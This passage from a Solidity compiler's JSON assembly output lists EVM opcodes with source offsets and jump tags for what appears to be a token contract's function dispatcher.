										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "DUP2"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "DUP2"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "AND"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "SWAP2"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "DUP2"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "ADD"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "SWAP1"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "SWAP2"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "AND"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "SWAP1"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "ADD"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP3"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SUB"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "RETURN"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "73"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "AND"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MSTORE"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SUB"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "ADD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "RETURN"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "75"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "77"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "77"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "AND"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMPDEST"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMPDEST"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH [tag]",
											"value": "82"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "JUMPDEST"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "DUP1"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "84"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "84"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "JUMPDEST"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "DUP1"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "87"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "87"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "AND"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "PUSH [tag]",
											"value": "88"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "AND"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "91"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMPDEST"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH [tag]",
											"value": "93"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "95"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "95"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "AND"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "96"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "JUMPDEST"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "PUSH [tag]",
											"value": "97"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "98"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "98"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "AND"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "PUSH [tag]",
											"value": "99"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "tag",
											"value": "97"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "JUMPDEST"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "MLOAD"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP3"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP4"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "MSTORE"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP4"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "ADD"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP2"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP2"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "MSTORE"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "MLOAD"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP2"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "DUP3"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SUB"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "ADD"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "SWAP1"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "RETURN"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "JUMPDEST"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "PUSH [tag]",
											"value": "101"
										},
										{
											"begin": 1114,
											"end": 1134,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMPDEST"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH [tag]",
											"value": "103"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "105"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "111"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "111"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP2"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "AND"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SWAP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "ADD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "112"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMPDEST"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "PUSH [tag]",
											"value": "114"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "JUMPDEST"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 18077,
											"end": 18498,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18077,
